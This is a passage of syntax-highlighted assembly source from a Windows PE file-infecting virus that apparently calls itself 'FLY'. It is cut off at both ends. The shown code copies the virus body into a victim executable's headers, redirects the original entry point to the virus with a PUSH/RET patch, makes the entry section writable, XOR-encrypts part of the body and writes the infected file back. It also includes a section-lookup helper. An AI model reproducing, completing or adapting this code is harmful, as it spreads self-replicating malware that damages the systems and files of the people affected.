        </span><span class="sc6">PUSH</span><span class="sc0">     </span><span class="sc5">dwMemBlockSize</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">     </span><span class="sc5">memcpy</span><span class="sc0">
        
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc4">]</span><span class="sc0">        
        
        </span><span class="sc1">;-&gt; fix section header table</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                                                  </span><span class="sc1">; ! reserve EBX</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pFirstSecHdr</span><span class="sc0">                                    </span><span class="sc1">; EAX -&gt; first section hdr</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwHdrSizeDelta</span><span class="sc0">                                  </span><span class="sc1">; EDX -&gt; hdr delta</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                                             </span><span class="sc1">; EBX -&gt; 0</span><span class="sc0">
  </span><span class="sc5">fix_and_replace_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">fix_and_replace_section</span><span class="sc0"> 
    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">                                                  </span><span class="sc1">; ! restore EBX</span><span class="sc0">
    
        </span><span class="sc1">;-&gt; insert virus body after the SectionHeaderTable</span><span class="sc0">
</span><span class="sc1">;   INT     3</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VIRUS_OFFSET</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">; EDI -&gt; ptr to the end of the SectionHeaderTable</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">]</span><span class="sc0">                               </span><span class="sc1">; ESI -&gt; start of the virus body</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLY_BODY_SIZE</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">

    </span><span class="sc1">;-&gt; insert EntryPoint RVA and ImageBase into virus body</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VIRUS_OFFSET</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">; EDX -&gt; virus body ptr (in victim)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">pVirusBody</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc1">; save OEP</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">dwEPRva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">)]</span><span class="sc0">
    </span><span class="sc1">; save ImageBase</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">b64Bit</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">ImageBase_is_qword</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">
  </span><span class="sc5">ImageBase_is_qword</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.IMAGE_NT_HEADERS64.OptionalHeader.ImageBase</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">dwVictimBase</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">dwImageBase</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        
        </span><span class="sc1">; -&gt; redirect EntryPoint, i.e.</span><span class="sc0">
        </span><span class="sc1">; Victim_EntryPoint:   PUSH    virii_entry_VA  (5 bytes)</span><span class="sc0">
        </span><span class="sc1">;                      RET                     (6 bytes)</span><span class="sc0">
        </span><span class="sc1">;INT     3</span><span class="sc0">
        </span><span class="sc1">; find section belonging to the EntryPoint</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">pFirstSecHdr</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RvaToSection</span><span class="sc0">                                         </span><span class="sc1">; EAX -&gt; sec hdr to which the EntryPoint RVA refers</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc5">.PUSHA_STRUCT._EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">cleanup_free_mem</span><span class="sc0">
        </span><span class="sc1">; save bytes at EntryPoint</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.VirtualAddress</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc0">     </span><span class="sc1">; EDX -&gt; EntryPoint Offset</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                                             </span><span class="sc1">; EDX -&gt; EntryPoint Ptr</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pVirusBody</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">bEntryData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">memcpy</span><span class="sc0">
        </span><span class="sc1">; assemble PUSH,RET at entry</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_OFFSET</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwVictimBase</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc1">; set write flag in EntryPoint section</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.Characteristics</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080000000h</span><span class="sc0">
                
    </span><span class="sc1">;-&gt; update NT hdrs</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.PointerToSymbolTable</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FLY_TRADEMARK</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OBFUSCATION_VAL</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OBFUSCATION_VAL</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc1">; change EntryPoint</span><span class="sc0">
    </span><span class="sc1">;PUSH    dwRealHdrSize</span><span class="sc0">
    </span><span class="sc1">;POP     [EDI].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint  </span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><span class="sc0">    </span><span class="sc1">; EDX -&gt; Entry RVA</span><span class="sc0">
    </span><span class="sc1">; clear BoundImport because if it had been present we overwrote it with the virus body</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory</span><span class="sc4">[</span><span class="sc2">11</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc5">.VirtualAddress</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">STOSD</span><span class="sc0">
    </span><span class="sc6">STOSD</span><span class="sc0">
    
    </span><span class="sc1">;-&gt; encrypt data parition</span><span class="sc0">
    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetXorByte</span><span class="sc0">                                           </span><span class="sc1">; arg pushed above</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">Variable_Crypt_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Variable_Crypt_Start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VIRUS_OFFSET</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Variable_Crypt_Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">))]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">memxor</span><span class="sc0">
    </span><span class="sc6">POPAD</span><span class="sc0">
    
    </span><span class="sc1">;-&gt; write mem to file</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                                             </span><span class="sc1">; EDI -&gt; 0</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFile</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc4">]</span><span class="sc0">     
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwc</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwFSize</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwHdrSizeDelta</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFile</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc4">]</span><span class="sc0">      

  </span><span class="sc5">cleanup_free_mem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">cleanup_file_handle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFile</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">InfectFile_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; [ESP  + 4] - ptr to first section header</span><span class="sc0">
</span><span class="sc1">; [ESP  + 8] - number of sections</span><span class="sc0">
</span><span class="sc1">; [ESP  + C] - dwRVA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">; NULL in case of an error or PIMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ReservedRegs: NO</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RvaToSection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ARG_3</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_1</span><span class="sc0">                                           </span><span class="sc1">; ESI -&gt; ptr to first section hdr</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_2</span><span class="sc0">                                           </span><span class="sc1">; ECX -&gt; number of sections</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_3</span><span class="sc0">                                           </span><span class="sc1">; EDI -&gt; target rva</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                                             </span><span class="sc1">; EBX -&gt; 0</span><span class="sc0">
  </span><span class="sc5">section_header_scan_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.VirtualAddress</span><span class="sc0">                            </span><span class="sc1">; RVA &gt;= VirtualAddress ?</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.Misc.VirtualSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                          </span><span class="sc1">; VS == 0 (needed for Watcom files)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">add_RawSize_instead</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.Misc.VirtualSize</span><span class="sc0">                          </span><span class="sc1">; RVA &lt; VirtualAddress + VirtualSize ?</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">compare</span><span class="sc0">
  </span><span class="sc5">add_RawSize_instead</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.SizeOfRawData</span><span class="sc0">
  </span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">scan_done</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">section_header_scan_loop</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">NOTHING</span><span class="sc0">
  </span><span class="sc5">scan_done</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; [ESP  + 4] - src</span><span class="sc0">
</span><span class="sc1">; [ESP  + 8] - dest</span><span class="sc0">
</span><span class="sc1">; [ESP  + C] - soue</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ReservedRegs: ALL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">memcpy</span><span class="sc4">:</span><span class="sc0">
